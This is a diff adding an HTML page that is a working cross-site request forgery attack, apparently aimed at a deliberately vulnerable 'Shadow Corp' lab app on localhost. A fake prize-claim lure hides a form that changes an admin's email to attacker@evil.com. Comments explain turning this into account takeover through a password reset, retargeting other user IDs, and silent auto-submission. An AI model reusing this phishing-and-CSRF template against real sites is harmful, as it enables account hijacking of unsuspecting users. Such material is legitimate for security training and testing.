@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>You've won a prize! 🎉</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 60px; background: #f0f0f0; }
+    h1 { color: #333; }
+    p  { color: #666; }
+  </style>
+</head>
+<body>
+  <h1>🎉 Congratulations! You've won a prize!</h1>
+  <p>Click the button below to claim your reward.</p>
+  <button onclick="document.getElementById('f').submit()">Claim Prize!</button>
+
+  <!--
+    CSRF ATTACK FORM
+    ================
+    When the victim (logged-in Shadow Corp admin) visits this page
+    and clicks the button (or if we auto-submit), this form silently
+    POSTs to the Shadow Corp admin panel, changing the victim's email.
+
+    Changing the email → attacker triggers password reset to that email
+    → full account takeover (ATO).
+
+    Works ONLY when VULN_CSRF=true (no CSRF token on the endpoint).
+  -->
+  <form id="f"
+        method="POST"
+        action="http://localhost:9999/admin/change-email"
+        style="display:none;">
+    <!--
+      Targeting user_id=6 (support_admin).
+      Change to any user ID to take over that account.
+    -->
+    <input type="hidden" name="user_id" value="6" />
+    <input type="hidden" name="email"   value="attacker@evil.com" />
+  </form>
+
+  <!-- Auto-submit version (no click required — silent CSRF):
+  <script>document.getElementById('f').submit();</script>
+  -->
+</body>
+</html>
